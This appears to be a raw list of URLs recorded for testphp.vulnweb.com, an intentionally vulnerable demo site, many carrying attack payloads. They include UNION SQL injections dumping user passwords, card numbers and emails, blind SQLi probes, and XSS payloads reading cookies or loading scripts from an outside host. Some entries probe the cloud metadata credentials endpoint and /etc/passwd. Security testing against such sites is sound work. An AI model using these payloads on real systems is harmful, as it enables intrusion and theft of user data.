      http://testphp.vulnweb.com:80/adm1npan3l
      http://testphp.vulnweb.com:80/adm1nPan3l/home.php
      http://testphp.vulnweb.com:80/admin
      http://testphp.vulnweb.com:80/admin.
      http://testphp.vulnweb.com:80/admin.asp
      http://testphp.vulnweb.com:80/admin.aspx
      http://testphp.vulnweb.com:80/admin.php
      http://testphp.vulnweb.com/admin/)
      http://testphp.vulnweb.com/admin/[200
      http://testphp.vulnweb.com/admin/[200]
      http://testphp.vulnweb.com:80/admin/admin.ajax
      http://testphp.vulnweb.com:80/admin/create.sql
      http://testphp.vulnweb.com:80/admin/CVS
      http://testphp.vulnweb.com:80/admin/index.php
      http://testphp.vulnweb.com:80/admin/login.php
      http://testphp.vulnweb.com:80/admin/upload
      http://testphp.vulnweb.com:80/admin/?C=D;O=A
      http://testphp.vulnweb.com:80/admin/?C=M;O=A
      http://testphp.vulnweb.com:80/admin/?C=N;O=D
      http://testphp.vulnweb.com:80/admin/?C=S;O=A
      http://testphp.vulnweb.com:80/admin_login
      http://testphp.vulnweb.com:80/admininfo.php
      http://testphp.vulnweb.com:80/administrator.php
      http://testphp.vulnweb.com:80/adminlogin.aspx
      http://testphp.vulnweb.com:80/AJAX
      http://testphp.vulnweb.com:80/AJAX/artists.php
      http://testphp.vulnweb.com/AJAX/categories.php
      http://testphp.vulnweb.com/AJAX/CONFIRMED
      http://testphp.vulnweb.com:80/AJAX/htaccess.conf
      http://testphp.vulnweb.com:80/AJAX/index.html
      http://testphp.vulnweb.com:80/AJAX/index.ph['
      http://testphp.vulnweb.com:80/AJAX/index.php
      http://testphp.vulnweb.com:80/AJAX/index.php'
      http://testphp.vulnweb.com:80/AJAX/index.php--user-data-dir
      http://testphp.vulnweb.com:80/AJAX/index.php%3Cxml%3E%3Cnode%20name=%22nodename1%22%3Enodetext1%3C/node%3E%3Cnode%20name=%22nodename2%22%3Enodetext2%3C/node%3E%3C/xml%3E
      http://testphp.vulnweb.com/AJAX/index.phpUser-Agent:
      http://testphp.vulnweb.com:80/AJAX/infoartist.php?
      http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
      http://testphp.vulnweb.com:80/ajax/infoartists.php
      http://testphp.vulnweb.com:80/AJAX/infocateg.php
      http://testphp.vulnweb.com:80/AJAX/infocateg.php%E3%80%91%E5%AD%98%E5%9C%A8sqlinject%E6%97%A0%E8%AF%AF%EF%BC%8C%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%BA%94%E7%9A%84%E4%BF%AE%E5%A4%8D
      http://testphp.vulnweb.com:80/AJAX/infocateg.php%E3%80%91%E5%B9%B6%E6%8F%90%E4%BA%A4%E3%80%90id=1%E3%80%91%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9E%84%E5%BB%BA%E4%B8%BA
      http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1
      http://testphp.vulnweb.com:80/AJAX/infotitle.php
      http://testphp.vulnweb.com:80/AJAX/showxml.php
      http://testphp.vulnweb.com/AJAX/styles.css
      http://testphp.vulnweb.com:80/AJAX/titles.php
      http://testphp.vulnweb.com/app-ads.txt
      http://testphp.vulnweb.com:80/array.php
      http://testphp.vulnweb.com:80/artist.php?
      http://testphp.vulnweb.com/artist.php?artist=1
      http://testphp.vulnweb.com/artists.php
      http://testphp.vulnweb.com:80/artists.php%22
      http://testphp.vulnweb.com:80/artists.php%20'
      http://testphp.vulnweb.com:80/artists.php%20HTTP/'
      http://testphp.vulnweb.com:80/artists.php%20order%20by%201--+
      http://testphp.vulnweb.com:80/artists.php'
      http://testphp.vulnweb.com:80/artists.php'%20order%20by%201--+
      http://testphp.vulnweb.com:80/artists.php*
      http://testphp.vulnweb.com/artists.php,http-waf-
      http://testphp.vulnweb.com/artists.php,http-waf-detect.detectBodyChanges
      http://testphp.vulnweb.com:80/artists.php..
      http://testphp.vulnweb.com:80/artists.php/artists.php%20HTTP/'
      http://testphp.vulnweb.com:80/artists.php/artists.php%20HTTP/1.1
      http://testphp.vulnweb.com:80/artists.php/artists=1
      http://testphp.vulnweb.com:80/artists.php%3Ch1%3Ehello%3C/h1%3E%3Cscript%3Ealert(%22hacked%22)%3C/script%3E
      http://testphp.vulnweb.com:80/artists.php%3Cscript%3Ealert(%22hacked%22)%3C/script%3E
      http://testphp.vulnweb.com:80/artists.php=%22%3E%3Cscript%3Ealert(2)%3C/script%3E
      http://testphp.vulnweb.com:80/artists.php=-1%20union%20select%201,database(),current_user()
      http://testphp.vulnweb.com:80/artists.php=-1%20unionselect%201,table_name,%203%20from%20information_schema.tables%20where%20table_scheme()%20limit0,1
      http://testphp.vulnweb.com:80/artists.php=1
      http://testphp.vulnweb.com:80/artists.php=1%20order%202
      http://testphp.vulnweb.com:80/artists.php=1%20union%20select%201
      http://testphp.vulnweb.com:80/artists.php=1'
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3
      http://testphp.vulnweb.com/artists.php?%20artist=1-SLEEP(3)
      http://testphp.vulnweb.com/artists.php?artist=1&
      http://testphp.vulnweb.com:80/artists.php?artist%20=1
      http://testphp.vulnweb.com/artists.php?artist=
      http://testphp.vulnweb.com/artists.php?artist=$%7Binjection
      http://testphp.vulnweb.com/artists.php?artist=-1
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,%20database%20(),%203
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,%20group_concat%20(pass),%203%20from%20users
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,%20group_concat%20(table_name),%203%20de%20information_schema.tables%20WHERE%20table_schema%20=%20database%20()
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,%20table_name,%203%20from%20information_schema.tables%20WHERE%20table_schema%20=%20database%20()%20limit%200,1
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,%20table_name,%203%20from%20information_schema.tables%20WHERE%20table_schema%20=%20database%20()%20limit%201,1
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,%20table_name,%203%20from%20information_schema.tables%20WHERE%20table_schema%20=%20database%20()%20limit%202,1
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,%20table_name,%203%20from%20information_schema.tables%20WHERE%20table_schema%20=%20database%20()%20limit%203,1
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,%20version%20(),%20current_user%20()
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,2,3
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,2,group_concat(pass)%20from%20users--
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,group_concat(cc),3%20from%20users
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name='users'
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,group_concat(email),3%20from%20users
      http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,group_concat(uname),3%20from%20users
      http://testphp.vulnweb.com/artists.php?artist=-1%20UNION%20SELECT%201,version(
      http://testphp.vulnweb.com/artists.php?artist=-1%20UNION%20SELECT%201,version(),current_user()
      http://testphp.vulnweb.com/artists.php?artist=-2
      http://testphp.vulnweb.com:80/artists.php?artist=1
      http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=0
      http://testphp.vulnweb.com/artists.php?artist=1%20AND%201=1
      http://testphp.vulnweb.com/artists.php?artist=1%20OR%2017-
      http://testphp.vulnweb.com/artists.php?artist=1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/artists.php?artist=1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com/artists.php?artist=1%20order%20by%201
      http://testphp.vulnweb.com/artists.php?artist=1%20order%20by%202
      http://testphp.vulnweb.com/artists.php?artist=1%20order%20by%204
      http://testphp.vulnweb.com/artists.php?artist=1%20union%20select%201,2,3
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2%20AND%20%28SELECT%200x47776a68%29=%27qSBB%27--%20wXyW
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2%20AND%20%28SELECT%20QUARTER%28NULL%29%29%20IS%20NULL--%20wXyW
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2%20AND%2005537=5469
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2%20AND%2005537=5537
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2%20AND%2006847=6847--%20wXyW
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2%20AND%202%2A3%2A8=6%2A9--%20wXyW
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2%20AND%203%2A2%3E%281%2A5%29--%20wXyW
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2%20AND%203%2A3%2A9%3C%282%2A4%29--%20wXyW
      http://testphp.vulnweb.com/artists.php?artist=1%E2%80%B2%20AND%203%2A3%3C%282%2A4%29--%20wXyW
      http://testphp.vulnweb.com:80/artists.php?artist=1'
      http://testphp.vulnweb.com/artists.php?artist=1+AND+1=1
      http://testphp.vulnweb.com/artists.php?artist=1,GET,artist,BTU
      http://testphp.vulnweb.com/artists.php?artist=1-SLEEP(3)
      http://testphp.vulnweb.com/artists.php?artist=10
      http://testphp.vulnweb.com/artists.php?artist=1Host:
      http://testphp.vulnweb.com/artists.php?artist=1HTTP/1.1
      http://testphp.vulnweb.com/artists.php?artist=1http://169.254.169.254/latest/meta-data/iam/security-credentials
      http://testphp.vulnweb.com/artists.php?artist=1union%20select%20group_concat%28schema_name%29%20from%20information_schema.schemata
      http://testphp.vulnweb.com/artists.php?artist=1union%20select%20group_concat%28schema_name%29%20from%20information_schema.schemataunion%20select%20group_concat%28schema_name%29,2,3,4,5,6,7,8,9,10%20from%20information_schema.schemata
      http://testphp.vulnweb.com/artists.php?artist=1User-Agent:
      http://testphp.vulnweb.com:80/artists.php?artist=2
      http://testphp.vulnweb.com/artists.php?artist=3
      http://testphp.vulnweb.com/artists.php?artist=3-D
      http://testphp.vulnweb.com/artists.php?artist=4+OR+true;--
      http://testphp.vulnweb.com/artists.php?artist=999999.9
      http://testphp.vulnweb.com/artists.php?artist=SCANT3R
      http://testphp.vulnweb.com/artists.php?artist=SCANT3R+REFLECT
      http://testphp.vulnweb.com/artists.php?artist=vuln10
      http://testphp.vulnweb.com:80/artists.phpartists.php
      http://testphp.vulnweb.com:80/artists.phpfuckyou
      http://testphp.vulnweb.com/artists.phpUser-Agent:
      http://testphp.vulnweb.com:80/artistsdetails.php
      http://testphp.vulnweb.com:80/artistsnewsdetails.php
      http://testphp.vulnweb.com:80/assets
      http://testphp.vulnweb.com/axvdigital
      http://testphp.vulnweb.com/Biolinky.co/agenxionplay
      http://testphp.vulnweb.com/bookshn.blogspot.com/
      http://testphp.vulnweb.com:80/bxss
      http://testphp.vulnweb.com/bxss/adminPan3l/
      http://testphp.vulnweb.com/bxss/adminPan3l/index.php
      http://testphp.vulnweb.com/bxss/adminPan3l/style.css
      http://testphp.vulnweb.com/bxss/cleanDatabase.php
      http://testphp.vulnweb.com/bxss/database_connect.php
      http://testphp.vulnweb.com/bxss/index.php
      http://testphp.vulnweb.com/bxss/test.js
      http://testphp.vulnweb.com:80/bxss/vuln.php?
      http://testphp.vulnweb.com:80/bxss/vuln.php?id=1
      http://testphp.vulnweb.com:80/cart.php
      http://testphp.vulnweb.com:80/cart.php%20[price=15000%20addcart=7'%22%20]
      http://testphp.vulnweb.com:80/cart.php'
      http://testphp.vulnweb.com/categories.php
      http://testphp.vulnweb.com:80/categories.php%22
      http://testphp.vulnweb.com:80/categories.php%20'
      http://testphp.vulnweb.com/categories.php%D0%92%D1%8B
      http://testphp.vulnweb.com:80/categories.php&fcbz=1
      http://testphp.vulnweb.com:80/categories.php'
      http://testphp.vulnweb.com/categories.php)
      http://testphp.vulnweb.com:80/categories.php/admin1.php
      http://testphp.vulnweb.com/categories.php/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/AJAX/artists.php
      http://testphp.vulnweb.com:80/categories.php/AJAX/index.php
      http://testphp.vulnweb.com:80/categories.php/artists.php
      http://testphp.vulnweb.com:80/categories.php/cart.php
      http://testphp.vulnweb.com:80/categories.php/categories.php
      http://testphp.vulnweb.com:80/categories.php/default.php
      http://testphp.vulnweb.com:80/categories.php/disclaimer.php
      http://testphp.vulnweb.com:80/categories.php/guestbook.php
      http://testphp.vulnweb.com:80/categories.php/index
      http://testphp.vulnweb.com:80/categories.php/index.php
      http://testphp.vulnweb.com/categories.php/listproducts.php?cat=%27
      http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=1
      http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=2
      http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=3
      http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=4
      http://testphp.vulnweb.com:80/categories.php/login
      http://testphp.vulnweb.com:80/categories.php/login.php
      http://testphp.vulnweb.com:80/categories.php/Posters
      http://testphp.vulnweb.com:80/categories.php/privacy.php
      http://testphp.vulnweb.com/categories.php/style.css
      http://testphp.vulnweb.com:80/categories.php/userinfo.php
      http://testphp.vulnweb.com:80/categories.php1
      http://testphp.vulnweb.com:80/categories.php=%22
      http://testphp.vulnweb.com:80/categories.php='
      http://testphp.vulnweb.com:80/categories.php=')
      http://testphp.vulnweb.com:80/categories.php=1
      http://testphp.vulnweb.com:80/categories.phpunion%20select%201,2,3,4,5--+
      http://testphp.vulnweb.com/categories.phpUser-Agent:
      http://testphp.vulnweb.com/categories.phpYou
      http://testphp.vulnweb.com:80/cgi-bin
      http://testphp.vulnweb.com:80/cgi-bin/status
      http://testphp.vulnweb.com/clearguestbook.phpGET
      http://testphp.vulnweb.com/clientaccesspolicy.xml
      http://testphp.vulnweb.com:80/comment.php?
      http://testphp.vulnweb.com:80/comment.php%3Ch1%3Etefa%3C/h1%3E
      http://testphp.vulnweb.com:80/comment.php?aid=1
      http://testphp.vulnweb.com:80/comment.php?aid=2
      http://testphp.vulnweb.com:80/comment.php?aid=3
      http://testphp.vulnweb.com:80/comment.php?pid=1
      http://testphp.vulnweb.com:80/comment.php?pid=2
      http://testphp.vulnweb.com:80/comment.php?pid=3
      http://testphp.vulnweb.com:80/comment.php?pid=4
      http://testphp.vulnweb.com:80/comment.php?pid=5
      http://testphp.vulnweb.com:80/comment.php?pid=6
      http://testphp.vulnweb.com:80/comment.php?pid=7
      http://testphp.vulnweb.com/comment.phpCONFIRMED
      http://testphp.vulnweb.com/comment.phpUser-Agent:
      http://testphp.vulnweb.com:80/Connections
      http://testphp.vulnweb.com:80/Connections/DB_Connection.php
      http://testphp.vulnweb.com/Content-Length:
      http://testphp.vulnweb.com/Cookie:
      http://testphp.vulnweb.com:80/crossdomain.xml
      http://testphp.vulnweb.com:80/CVS
      http://testphp.vulnweb.com/CVS/)
      http://testphp.vulnweb.com/CVS/[200
      http://testphp.vulnweb.com/CVS/[200]
      http://testphp.vulnweb.com:80/CVS/Entries
      http://testphp.vulnweb.com:80/CVS/Entries.Log
      http://testphp.vulnweb.com:80/CVS/Repository
      http://testphp.vulnweb.com:80/CVS/Root
      http://testphp.vulnweb.com:80/database_connect.php
      http://testphp.vulnweb.com:80/database_connect.phps
      http://testphp.vulnweb.com:80/default.php
      http://testphp.vulnweb.com:80/detailsartists.php
      http://testphp.vulnweb.com:80/detialsarray.php
      http://testphp.vulnweb.com:80/disclaimer.php
      http://testphp.vulnweb.com:80/disclaimer.php=1
      http://testphp.vulnweb.com/donalxyz.blogspot.com/
      http://testphp.vulnweb.com:80/editor
      http://testphp.vulnweb.com:80/etc
      http://testphp.vulnweb.com:80/etc/passwd
      http://testphp.vulnweb.com/favicon.ico
      http://testphp.vulnweb.com:80/file
      http://testphp.vulnweb.com:80/Flash
      http://testphp.vulnweb.com/Flash/add.fla
      http://testphp.vulnweb.com/Flash/add.swf
      http://testphp.vulnweb.com/Flash/add.swf%E2%80%99
      http://testphp.vulnweb.com/flavorfascination.com/
      http://testphp.vulnweb.com:80/forward.php?
      http://testphp.vulnweb.com:80/ftp
      http://testphp.vulnweb.com/FUZZ
      http://testphp.vulnweb.com/FUZZ%22
      http://testphp.vulnweb.com:80/GET%20/comment.php?
      http://testphp.vulnweb.com:80/GET%20/listproducts.php?
      http://testphp.vulnweb.com:80/GET%20/showimage.php?
      http://testphp.vulnweb.com/guestbook.php
      http://testphp.vulnweb.com:80/guestbook.php'
      http://testphp.vulnweb.com:80/guestbook.php%3Cscript%3Ealert(%22XSS%20ATTACK%20By%20BINUSHACKER%20TEAM%22)%3C/script%3E
      http://testphp.vulnweb.com:80/guestbook.php%3Cscript%3Ealert(%22XSS%20ATTACK%20By%20BINUSHACKER%20TEAM%22)%3C/script%3E%3CMARQUEE%20BGCOLOR=%22RED%22%3E%3CH1%3EXSS%20Attack%20by%20BinusHacker%20Team%3C/H1%3E%3C/MARQUEE%3E
      http://testphp.vulnweb.com:80/guestbook.php%3Cscript%3Ealert('xss')%3C/script%3E
      http://testphp.vulnweb.com:80/guestbook.php%3Cscript%3Ealert(document.cookie);%3C/scirpt%3E
      http://testphp.vulnweb.com/guestbook.phpCONFIRMED
      http://testphp.vulnweb.com/guestbook.phpUser-Agent:
      http://testphp.vulnweb.com/healthwawpl32.blogspot.com/
      http://testphp.vulnweb.com:80/hj
      http://testphp.vulnweb.com:80/hj/va
      http://testphp.vulnweb.com:80/hj/var
      http://testphp.vulnweb.com:80/hj/var/www
      http://testphp.vulnweb.com:80/hj/var/www/artists
      http://testphp.vulnweb.com:80/hj/var/www/artists.html
      http://testphp.vulnweb.com:80/hj/var/www/artists.php
      http://testphp.vulnweb.com:80/hj/var/www/artists.xml
      http://testphp.vulnweb.com:80/hj/var/www/listproducts.php
      http://testphp.vulnweb.com:80/hj/var/www/search.php
      http://testphp.vulnweb.com/Hosttestphp.vulnweb.comServer
      http://testphp.vulnweb.com:80/hpp
      http://testphp.vulnweb.com:80/hpp/index.php
      http://testphp.vulnweb.com:80/hpp/index.php?pp=12
      http://testphp.vulnweb.com:80/hpp/params.ph
      http://testphp.vulnweb.com:80/hpp/params.php?
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%25
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Ealert(0x107E91
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Ealert(0x107E91)%3C%2fscRipt%3E&pp=12
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Enetsparker(0x0
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Enetsparker(0x004FC3
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Enetsparker(0x004FC3)%3C%2fscRipt%3E&pp=12
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Enetsparker(0x1
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=%3CscRipt%3Enetsparker(0x107E91
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=N3tSp4rK3R&pp=12
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=val
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12&aaaa%2f=
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CiMg%20src%253
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CiMg%20src%3d%22%2f%2fr87.me%2fimages%2f1.jpg%22%20onload%3d%22this.onload%3d''%3bthis.src%3d'%2f%2fmv9e8mbvfflt-5t3c4td9zm1_axokh_ruxslkabx'%2b'ww4.r87.me%2fr%2f%3f'%2blocation.href%22%3E
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CiMg%20src%3d%22%2f%2fr87.me%2fimages%2f1.jpg%22%20onload%3d%22this.onload%3d''%3bthis.src%3d'%2f%2fmv9e8mbvfflt-5t3c4td9zm1_axokh_ruxslkabx'%2b'ww4.r87.me%2fr%2f%3f'%2blocation.href%22%3ECONFIRMED
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CscRipt%3Ealert(0x107FBD
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CscRipt%3Ealert(0x107FBD)%3C%2fscRipt%253
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CscRipt%3Ealert(0x107FBD)%3C%2fscRipt%3E
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CscRipt%3Enets
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CscRipt%3Enetsparker(0x005036
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CscRipt%3Enetsparker(0x005036)%3C%2fscRipt%3E
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=valid&pp=%3CscRipt%3Enetsparker(0x107FBD
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=3&p
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=3&p=%3CiMg%20src%3d%22%252
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=3&p=%3CiMg%20src%3d%22%2f%2fr87.me%2fimages%2f1.jpg%22%20onload%3d%22this.onload%3d''%3bthis.src%3d'%2f%2fmv9e8mbvffdujmqnumt1bjkxifmvoyfr6vtb3zin'%2b'jak.r87.me%2fr%2f%3f'%2blocation.href%22%3E&pp=12
      http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=3&p=%3CiMg%20src%3d%22%2f%2fr87.me%2fimages%2f1.jpg%22%20onload%3d%22this.onload%3d''%3bthis.src%3d'%2f%2fmv9e8mbvffdujmqnumt1bjkxifmvoyfr6vtb3zin'%2b'jak.r87.me%2fr%2f%3f'%2blocation.href%22%3E&pp=12CONFIRMED
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt;
      http://testphp.vulnweb.com/hpp/params.php?p=&lt;iframe
      http://testphp.vulnweb.com/hpp/params.php?p=
      http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript
      http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
      http://testphp.vulnweb.com/hpp/test.php
      http://testphp.vulnweb.com/hpp/User-Agent:
      http://testphp.vulnweb.com/hpp/?pp='%22--%3E%3C%2fstyle%3E%3C%2fscRipt%3E%3CscRipt%20src%3d%22%2f%2fmv9e8mbvffulk1i0duvujvkdkktmkntnztbb8kejrja%26%2346%3br87%26%2346%3bme%22%3E%3C%2fscRipt%3E
      http://testphp.vulnweb.com/hpp/?pp='%22--%3E%3C%2fst
      http://testphp.vulnweb.com/hpp/?pp='%22--%3E%3C%2fstyle%3E%3C%2fscRipt%3E%25
      http://testphp.vulnweb.com:80/hpp/?pp=12
      http://testphp.vulnweb.com/hpp/?pp=12User-Agent:
      http://testphp.vulnweb.com/hpp/?pp=aaa%22bbb
      http://testphp.vulnweb.com/hpp/?pp=x%22%20onmouseove
      http://testphp.vulnweb.com/hpp/?pp=x%22%20onmouseover%3dalert(0x106ED2
      http://testphp.vulnweb.com/hpp/?pp=x%22%20onmouseover%3dalert(0x106ED2)%20x%3d%22
      http://testphp.vulnweb.com/hpp/?pp=x%22%20onmouseover%3dnetsparker(0x00333D
      http://testphp.vulnweb.com/hpp/?pp=x%22%20onmouseover%3dnetsparker(0x00333D)%20x%3d%22
      http://testphp.vulnweb.com/hpp/?pp=x%22%20onmouseover%3dnetsparker(0x106ED2
      http://testphp.vulnweb.com:80/http:/listproducts.php=1'
      http://testphp.vulnweb.com/http://testphp.vulnweb.com/
      http://testphp.vulnweb.com:80/http://testphp.vulnweb.com/artists.php
      http://testphp.vulnweb.com:80/http://www.atmarine.fi/index.php
      http://testphp.vulnweb.com:80/http://www.localroot.net/r57-txt.html
      http://testphp.vulnweb.com/id/%251%25/index.html
      http://testphp.vulnweb.com:80/idnf
      http://testphp.vulnweb.com:80/image.php
      http://testphp.vulnweb.com:80/images
      http://testphp.vulnweb.com/images/)
      http://testphp.vulnweb.com/images/[200
      http://testphp.vulnweb.com/images/[200]
      http://testphp.vulnweb.com/images/logo.gif%E2%80%99
      http://testphp.vulnweb.com:80/index
      http://testphp.vulnweb.com:80/index.asp
      http://testphp.vulnweb.com:80/index.aspx
      http://testphp.vulnweb.com:80/index.bak
      http://testphp.vulnweb.com/index.bak%29
      http://testphp.vulnweb.com/index.bak[200
      http://testphp.vulnweb.com/index.bak[200]
      http://testphp.vulnweb.com:80/index.html
      http://testphp.vulnweb.com:80/index.php
      http://testphp.vulnweb.com:80/index.php%22
      http://testphp.vulnweb.com:80/index.php%20cat=1
      http://testphp.vulnweb.com:80/index.php%20ORDER%20BY%201--
      http://testphp.vulnweb.com:80/index.php%20php
      http://testphp.vulnweb.com:80/index.php'
      http://testphp.vulnweb.com:80/index.php''
      http://testphp.vulnweb.com:80/index.php'1or'1'='1
      http://testphp.vulnweb.com:80/index.php'%3Ch1%3Etefa%3C/h1%3E'
      http://testphp.vulnweb.com/index.php)
      http://testphp.vulnweb.com:80/index.php%3Ch1%3Etefa%3C/h1%3E
      http://testphp.vulnweb.com:80/index.php%3Cscript%3Ealert(%22mo%22);%3C/script%3E
      http://testphp.vulnweb.com:80/index.php%3Cscript%3Ealert(document.cookie);%3C/scirpt%3E
      http://testphp.vulnweb.com/index.php?%25id%25=1&user=2
      http://testphp.vulnweb.com/index.php?id=%252%25&user=1
      http://testphp.vulnweb.com/index.php[200
      http://testphp.vulnweb.com/index.php[200]
      http://testphp.vulnweb.com:80/index.phphttp://csgo-gg-wp.ru
      http://testphp.vulnweb.com:80/index.phpunion%20select%20'hello1','hello2','hello3','hello4','hello5'--+
      http://testphp.vulnweb.com/index.zip
      http://testphp.vulnweb.com:80/lis
      http://testphp.vulnweb.com:80/list%20products.php
      http://testphp.vulnweb.com:80/listp
      http://testphp.vulnweb.com/listprodu
      http://testphp.vulnweb.com:80/listproduc
      http://testphp.vulnweb.com:80/listproduc...
      http://testphp.vulnweb.com:80/listproduct
      http://testphp.vulnweb.com:80/listproduct.php
      http://testphp.vulnweb.com:80/listproducts
      http://testphp.vulnweb.com/listproducts.php
      http://testphp.vulnweb.com:80/listproducts.php=1'
      http://testphp.vulnweb.com:80/listproducts.php=cat=1
      http://testphp.vulnweb.com/listproducts.php?artist=%3Ciframe%20src%3d%22%2f%2fmv9e8mbvffhnljeuznntumzdcj12cbq-dn-_jxrwote%26%2346%3br87%26%2346%3bme%22%3E%3C%2fiframe%3E
      http://testphp.vulnweb.com/listproducts.php?cat=%3Ciframe%20src%3d%22%2f%2fmv9e8mbvffalfsrxrjwetv5xhynulh9krdrtzndh23g%26%2346%3br87%26%2346%3bme%22%3E%3C%2fiframe%3E
      http://testphp.vulnweb.com/listproducts.php?cat=123&
      http://testphp.vulnweb.com/listproducts.php?cat=123%22&
      http://testphp.vulnweb.com/listproducts.php?-
      http://testphp.vulnweb.com/listproducts.php?artist=123&amp;asdf=ff&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?artist=123&amp;asdf=ff&amp;cat=123DalFox
      http://testphp.vulnweb.com/listproducts.php?artist
      http://testphp.vulnweb.com/listproducts.php?artist='
      http://testphp.vulnweb.com/listproducts.php?artist=1
      http://testphp.vulnweb.com/listproducts.php?artist=1%20OR%2017-7%3d10
      http://testphp.vulnweb.com/listproducts.php?artist=1%20OR%2017-7%3d10CONFIRMED
      http://testphp.vulnweb.com/listproducts.php?artist=1%20OR%25
      http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123DalFox
      http://testphp.vulnweb.com/listproducts.php?artist=2
      http://testphp.vulnweb.com/listproducts.php?artist=%3Cifram
      http://testphp.vulnweb.com/listproducts.php?artist=%3Ciframe%20src%3d%22%2f%2fmv
      http://testphp.vulnweb.com/listproducts.php?artist=%3CscRip
      http://testphp.vulnweb.com/listproducts.php?artist=%3CscRipt%3Ealert(0x106C07
      http://testphp.vulnweb.com/listproducts.php?artist=%3CscRipt%3Ealert(0x106C07)%3C%2fscRipt%3E
      http://testphp.vulnweb.com/listproducts.php?artist=%3CscRipt%3Enetsparker(0x004DC
      http://testphp.vulnweb.com/listproducts.php?artist=%3CscRipt%3Enetsparker(0x004DC0
      http://testphp.vulnweb.com/listproducts.php?artist=%3CscRipt%3Enetsparker(0x004DC0)%3C%2fscRipt%3E
      http://testphp.vulnweb.com/listproducts.php?artist=%3CscRipt%3Enetsparker(0x106C07
